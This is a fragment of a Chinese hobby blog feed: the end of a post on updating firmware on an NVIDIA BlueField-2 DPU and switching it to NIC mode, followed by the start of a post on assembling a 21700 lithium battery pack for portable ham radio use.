title="11、冷重启电脑，查看网卡版本"></a>11、冷重启电脑，查看网卡版本</h2><p>查看到网卡版本已经更新到24.35.2000了</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">root@recopec-MS-7D25:/home/recopec# mlxfwmanager</span></span><span class="line"><span style="color: #abb2bf">Querying Mellanox devices firmware ...</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">Device #1:</span></span><span class="line"><span style="color: #abb2bf">----------</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  Device Type:      BlueField2</span></span><span class="line"><span style="color: #abb2bf">  Part Number:      MBF2M345A-VENOT_ES_Ax</span></span><span class="line"><span style="color: #abb2bf">  Description:      NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management</span></span><span class="line"><span style="color: #abb2bf">  PSID:             MT_0000000809</span></span><span class="line"><span style="color: #abb2bf">  PCI Device Name:  0000:06:00.0</span></span><span class="line"><span style="color: #abb2bf">  Base GUID:        b8cef60300f8d88a</span></span><span class="line"><span style="color: #abb2bf">  Base MAC:         b8cef6f8d88a</span></span><span class="line"><span style="color: #abb2bf">  Versions:         Current        Available     </span></span><span class="line"><span style="color: #abb2bf">     FW             24.35.2000     N/A           </span></span><span class="line"><span style="color: #abb2bf">     PXE            3.6.0805       N/A           </span></span><span class="line"><span style="color: #abb2bf">     UEFI           14.28.0016     N/A           </span></span><span class="line"><span style="color: #abb2bf">     UEFI Virtio blk   22.4.0010      N/A           </span></span><span class="line"><span style="color: #abb2bf">     UEFI Virtio net   21.4.0010      N/A           </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  Status:           No matching image found</span></span></code></pre></div></div></figure><p>这个版本 UEFI BIOS 里面仍旧没有网卡模式选项，所以继续升级版本。</p><h2 id="12、DPU-更新-DOCA-2-7-版本"><a href="#12、DPU-更新-DOCA-2-7-版本" class="headerlink" title="12、DPU 更新 DOCA 2.7 版本"></a>12、DPU 更新 DOCA 2.7 版本</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">bfb-install</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--rshim</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rshim0</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--bfb</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bf-bundle-2.7.0-33_24.04_ubuntu-22.04_prod.bfb</span></span></code></pre></div></div></figure><p>更新过程中会提示更新 NIC FW 错误，不用管他</p><h2 id="13、启动成功后修改默认账户和密码"><a href="#13、启动成功后修改默认账户和密码" class="headerlink" title="13、启动成功后修改默认账户和密码"></a>13、启动成功后修改默认账户和密码</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Mellanox BlueField-2 A1 BL1 V1.1                                                </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No CDI passed to Riot core!                                            </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: v2.2(release):4.7.0-25-g5569834                                  </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Built : 22:05:22, Apr 26 2024                                    </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R built for hw (ver 1)                                              </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Booting BL2                                                      </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: v2.2(release):4.7.0-25-g5569834                                   </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: Built : 22:05:22, Apr 26 2024                                     </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2 built for hw (ver 1)                                               </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Running as MBF2M345A-VENOT_ system                                     </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM0                                          </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM1                                          </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Finished initializing DDR                                              </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  DDR POST passed.                                                       </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: v2.2(release):4.7.0-25-g5569834                                  </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: Built : 22:05:22, Apr 26 2024                                    </span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31 built for hw (ver 1), lifecycle GA Non-Secured                    </span></span><span class="line"><span style="color: #abb2bf">UEFI firmware (version BlueField:4.7.0-42-g13081ae-BId13127 built at 22:23:12 o)</span></span></code></pre></div></div></figure><p>ubuntu ubuntu</p><p>ubuntu Bf1122334455</p><h2 id="13、更新网卡版本"><a href="#13、更新网卡版本" class="headerlink" title="13、更新网卡版本"></a>13、更新网卡版本</h2><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mst</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">start</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mst</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">status</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mlxfwmanager</span><span style="color: #ABB2BF">                                            </span></span><span class="line"><span style="color: #61AFEF">Querying</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mellanox</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">devices</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firmware</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">...</span><span style="color: #ABB2BF">                                           </span></span><span class="line"><span style="color: #ABB2BF">                                                                                 </span></span><span class="line"><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">#1:                                                                       </span></span><span class="line"><span style="color: #61AFEF">----------</span><span style="color: #ABB2BF">                                                                       </span></span><span class="line"><span style="color: #ABB2BF">                                                                                 </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Type:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">BlueField2</span><span style="color: #ABB2BF">                                                   </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Part</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Number:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">MBF2M345A-VENOT_ES_Ax</span><span style="color: #ABB2BF">                                        </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Description:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">NVIDIA</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">BlueField-2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">E-Series</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Eng.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">sample</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DPU</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">200GbE</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">single-pt</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PSID:</span><span style="color: #ABB2BF">             </span><span style="color: #98C379">MT_0000000809</span><span style="color: #ABB2BF">                                                </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Name:</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">/dev/mst/mt41686_pciconf0</span><span style="color: #ABB2BF">                                    </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GUID:</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">b8cef60300f8d88a</span><span style="color: #ABB2BF">                                             </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">MAC:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">b8cef6f8d88a</span><span style="color: #ABB2BF">                                                 </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Versions:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">Current</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">Available</span><span style="color: #ABB2BF">                                     </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">FW</span><span style="color: #ABB2BF">             </span><span style="color: #D19A66">24.35</span><span style="color: #98C379">.2000</span><span style="color: #ABB2BF">     </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">                                           </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">PXE</span><span style="color: #ABB2BF">            </span><span style="color: #D19A66">3.6</span><span style="color: #98C379">.0805</span><span style="color: #ABB2BF">       </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">                                           </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF">           </span><span style="color: #D19A66">14.28</span><span style="color: #98C379">.0016</span><span style="color: #ABB2BF">     </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">                                           </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">blk</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">22.4</span><span style="color: #98C379">.0010</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">                                        </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">net</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">21.4</span><span style="color: #98C379">.0010</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">                                        </span></span><span class="line"><span style="color: #ABB2BF">                                                                                 </span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Status:</span><span style="color: #ABB2BF">           </span><span style="color: #98C379">No</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">matching</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">image</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">found</span></span></code></pre></div></div></figure><p>传送网卡固件到 DPU 内</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mlxfwmanager_sriov_dis_aarch64_41686</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ubuntu@192.168.100.2:/home/ubuntu/</span></span></code></pre></div></div></figure><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">chmod</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">+x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mlxfwmanager_sriov_dis_aarch64_41686</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">./mlxfwmanager_sriov_dis_aarch64_41686</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Querying</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mellanox</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">devices</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firmware</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">...</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">#1:</span></span><span class="line"><span style="color: #61AFEF">----------</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Type:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">BlueField2</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Part</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Number:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">MBF2M345A-VENOT_ES_Ax</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Description:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">NVIDIA</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">BlueField-2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">E-Series</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Eng.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">sample</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DPU</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">200GbE</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">single-port</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">QSFP56</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">PCIe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Gen4</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x16</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Secure</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Boot</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Disabled</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Crypto</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Enabled</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">16GB</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">on-board</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DDR</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">1GbE</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">OOB</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">management</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PSID:</span><span style="color: #ABB2BF">             </span><span style="color: #98C379">MT_0000000809</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Name:</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">/dev/mst/mt41686_pciconf0</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GUID:</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">b8cef60300f8d88a</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">MAC:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">b8cef6f8d88a</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Versions:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">Current</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">Available</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">FW</span><span style="color: #ABB2BF">             </span><span style="color: #D19A66">24.35</span><span style="color: #98C379">.2000</span><span style="color: #ABB2BF">     </span><span style="color: #D19A66">24.39</span><span style="color: #98C379">.3560</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">NVMe</span><span style="color: #ABB2BF">           </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">            </span><span style="color: #D19A66">20.4</span><span style="color: #98C379">.0001</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">PXE</span><span style="color: #ABB2BF">            </span><span style="color: #D19A66">3.6</span><span style="color: #98C379">.0805</span><span style="color: #ABB2BF">       </span><span style="color: #D19A66">3.7</span><span style="color: #98C379">.0300</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF">           </span><span style="color: #D19A66">14.28</span><span style="color: #98C379">.0016</span><span style="color: #ABB2BF">     </span><span style="color: #D19A66">14.32</span><span style="color: #98C379">.0017</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">blk</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">22.4</span><span style="color: #98C379">.0010</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">22.4</span><span style="color: #98C379">.0012</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">net</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">21.4</span><span style="color: #98C379">.0010</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">21.4</span><span style="color: #98C379">.0013</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Status:</span><span style="color: #ABB2BF">           </span><span style="color: #98C379">Update</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">required</span></span></code></pre></div></div></figure><p>冷重启之后查看到更新完成</p><img src="/nvidia_boyfriend/image-20240715211452502.png" class="" title="image-20240715211452502"><h2 id="14、切换为-NIC-模式"><a href="#14、切换为-NIC-模式" class="headerlink" title="14、切换为 NIC 模式"></a>14、切换为 NIC 模式</h2><p><a href="https://docs.nvidia.com/doca/sdk/nvidia+bluefield+modes+of+operation/index.html#src-2609505413_id-.NVIDIABlueFieldModesofOperationv2.7.0-NICModeforBlueField-2">https://docs.nvidia.com/doca/sdk/nvidia+bluefield+modes+of+operation/index.html#src-2609505413_id-.NVIDIABlueFieldModesofOperationv2.7.0-NICModeforBlueField-2</a></p><p>非常简单，官方提供了几种模式，其中最方便的是在 ARM 的 UEFI BIOS 里面修改。</p><ol><li>Select “Device Manager”.</li><li>Select “System Configuration”.</li><li>Select “BlueField Modes”.</li><li>Set the “NIC Mode” field to <code>NicMode</code> to enable NIC mode.</li></ol><img src="/nvidia_boyfriend/image-20240715210804919.png" class="" title="image-20240715210804919"><img src="/nvidia_boyfriend/image-20240715210920040.png" class="" title="image-20240715210920040"><img src="/nvidia_boyfriend/image-20240715211052801.png" class="" title="image-20240715211052801"><p>上面的貌似不起作用，用下面这个试试。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">启用</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">NIC</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">模式</span></span><span class="line"><span style="color: #61AFEF">mlxconfig</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mt41686_pciconf0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">INTERNAL_CPU_PAGE_SUPPLIER=</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">INTERNAL_CPU_ESWITCH_MANAGER=</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">INTERNAL_CPU_IB_VPORT0=</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">INTERNAL_CPU_OFFLOAD_ENGINE=</span><span style="color: #D19A66">1</span></span></code></pre></div></div></figure><img src="/nvidia_boyfriend/image-20240715213306232.png" class="" title="image-20240715213306232"><p>重启之后，网卡显示未插入网线，应该是正常了？我没有条件测试，就这样了，给物主发回去了。</p><p>所有的资源都在这里，网盘链接失效了的话就从我NAS里面慢慢拖吧，另外官网里面都有下载地址，随便找找就有了。</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1UV7XDu6N3P9oROhStSS8hw?pwd=2333">https://pan.baidu.com/s/1UV7XDu6N3P9oROhStSS8hw?pwd=2333</a><br>提取码：2333 </p><p><a href="https://alist.irec.moe/@login">https://alist.irec.moe/@login</a></p><p>用户名：bf</p><p>密码：bf12345</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前情提要&quot;&gt;&lt;a href=&quot;#前情提要&quot; class=&quot;headerlink&quot; title=&quot;前情提要&quot;&gt;&lt;/a&gt;前情提要&lt;/h1&gt;&lt;p&gt;朋友搞来一块 NVIDIA BlueField-2 给我来玩玩，据说是他进 DPU 里面的 ARM 系统里面执行了一下更新命</summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="网卡" scheme="https://blog.irec.moe/tags/%E7%BD%91%E5%8D%A1/"/>
    
  </entry>
  
  <entry>
    <title>炸飞老铁之自组电池组</title>
    <link href="https://blog.irec.moe/zhafeilaotie.html"/>
    <id>https://blog.irec.moe/zhafeilaotie.html</id>
    <published>2024-06-05T04:00:00.000Z</published>
    <updated>2024-06-05T02:16:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>近期由于入了短波无线<del>垫</del>（电）坑，迫切需要一块电池供野外架台使用，所以萌生了组一块电池组的想法。刚好自己有一些曾经从PDD薅羊毛来的电芯，遂，开干！</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>查阅了一些资料，刚开始认为电池12.6V给电台用够了，另外给我自己的12V用电设备也OK，所以初步拟定电池是3S2P。然后想着8Ah容量会不会太小了，准备再并一组，在淘宝上买了一些疑似假的40LA，内阻比普通的40LA高，普遍都在9mΩ左右，不过好在还能用，容量也差不多。</p><h2 id="BOM表"><a href="#BOM表" class="headerlink" title="BOM表"></a>BOM表</h2><table><thead><tr><th>名称</th><th>价格</th><th>数量</th><th>实付款</th><th>购买渠道</th></tr></thead><tbody><tr><td>21700 LS40LA K标</td><td>5</td><td>6</td><td>30</td><td>拼多多 砸金蛋，现无活动</td></tr><tr><td>21700 LS40LA 假标</td><td>5</td><td>3</td><td>15</td><td>淘宝 诺祥锂电池</td></tr><tr><td>21700 支架款镍片</td><td>4.5</td><td>1</td><td>2.5</td><td>天猫</td></tr><tr><td>21700 青稞纸 60张</td><td>2.8</td><td>1</td><td>0.8</td><td>天猫 启色数码旗舰店</td></tr><tr><td>21700 三联支架 6个</td><td>2.2</td><td>1</td><td>0.2</td><td>天猫 汉亨旗舰店</td></tr><tr><td>4P排线 XH2.54</td><td>1.7</td><td>2</td><td>1.4</td><td>淘宝 新容芯科技企业店</td></tr><tr><td>三线电压表 0.28寸</td><td>2.8</td><td>1</td><td>0.8</td><td>淘宝</td></tr><tr><td>船型开关</td><td>0</td><td>0</td><td>0</td><td>坏的热熔胶枪上拆的</td></tr><tr><td>外壳 AG 110 * 80 * 85</td><td>4.6</td><td>1</td><td>2.71</td><td>淘宝</td></tr><tr><td>软硅胶线 12AWG</td><td>4.3</td><td>2</td><td>5.4</td><td>淘宝</td></tr><tr><td>XT60E-F 带黑色防尘盖</td><td>3</td><td>1</td><td>0.91</td><td>淘宝</td></tr><tr><td>M2.5&#x2F;2.0 螺丝螺母诺干</td><td>0</td><td>0</td><td>0</td><td>现有的</td></tr></tbody></table><img src="/zhafeilaotie/Screenshot_2024-06-05-08-11-15-14_090d9ae461b065ca11c329abb9cd0d70.jpg" class="" title="Screenshot_2024-06-05-08-11-15-14_090d9ae461b065ca11c329abb9cd0d70"><p>通过88VIP+签到红包配合下来买这些零碎的东西还是很便宜的。</p><h2 id="收货中"><a href="#收货中" class="headerlink" title="收货中"></a>收货中</h2><h3 id="测试新电池"><a href="#测试新电池" class="headerlink" title="测试新电池"></a>测试新电池</h3><p>东西陆陆续续到货中，最开始到的是这个假标的40LA，外皮皱皱巴巴，尺寸也比K标的40LA大一圈，重量也不对。扫码二维码是不对的，观察外皮上的二维码图案也看的出来是一样的。怀疑是其他的型号套皮，不过测出来的内阻和容量都在可接受范围内，问商家商家装傻，就不和他纠缠了，直接如实评价送上。</p><img src="/zhafeilaotie/IMG_20240525_165306.jpg" class="" title="IMG_20240525_165306"><img src="/zhafeilaotie/Screenshot_2024-05-25-16-58-02-81_783cbc6a91259090a60dd1872b058806.jpg" class="" title="Screenshot_2024-05-25-16-58-02-81_783cbc6a91259090a60dd1872b058806"><img src="/zhafeilaotie/image-20240605082253170.png" class="" title="image-20240605082253170"><h1 id="制作过程"><a href="#制作过程" class="headerlink" title="制作过程"></a>制作过程</h1><h2 id="装盒预组"><a href="#装盒预组" class="headerlink" title="装盒预组"></a>装盒预组</h2><p>支架和青稞纸到了，把电池拿来做一下预组，称一下重量和量一下尺寸，塞进盒子里面。</p><img src="/zhafeilaotie/IMG_20240528_201425.jpg" class="" title="IMG_20240528_201425"><img src="/zhafeilaotie/IMG_20240528_201441.jpg" class="" title="IMG_20240528_201441"><p>发现塞不进盒子的顶盖，后面才发现顶盖是有凸起的结构的，具体尺寸还是要比<strong>标称的内盒尺寸</strong>小一圈，卖家完全没有说这个尺寸会偏小的问题，我这个<code>AG 110*80*85</code>型号的实测尺寸如下。</p><p>上盖：69.2mm*70.1mm</p><p>内盒：73.3mm*73.7mm</p><img src="/zhafeilaotie/IMG_20240531_152835.jpg" class="" title="IMG_20240531_152835"><p>电池组之前量的尺寸是70.6mm，刚好塞不进去上盖，把凸起的榫头给他切了，刚好放进去。</p><p>最后的电池尺寸是68.8mm*69.3mm。</p><h2 id="盒子开孔"><a href="#盒子开孔" class="headerlink" title="盒子开孔"></a>盒子开孔</h2><p>因为电池组不带保护板，为了监控电池电压，准备加一个开关和一个电压表，初步定的位置是在上盖。XT60接口的话，就开在盒子内正面。</p><p>想法有了，立马开干，可结果不尽人意。</p><p>计划是用宝塔钻开孔，然后慢慢扩，可是掌握不了力度，最后开的稀烂，如图。</p><img src="/zhafeilaotie/image-20240605083752953.png" class="" title="image-20240605083752953"><img src="/zhafeilaotie/image-20240605083812099.png" class="" title="image-20240605083812099"><p>和狗啃一样，但是还能用（xD。发群里请教经验，结果被狠狠嘲笑了。</p><img src="/zhafeilaotie/image-20240605083851092.png" class="" title="image-20240605083851092"><p>然后 BG7EHL 大佬出来传授经验，如下</p><blockquote><p>第一步 这个方孔要先划线，用刀片就行。划完脏手一摸就有印了，手太干净可以先到锅底摸一把。<br>第二步 四个角打孔。3.2-4.0就行。俗称小钻花。打到线里面不要过线。<br>第三步 烧报废的钢锯条。或者刀片都行，烧红了就沿着线里面一按就切穿了。4个边一切这个孔就出来了。<br>第四步 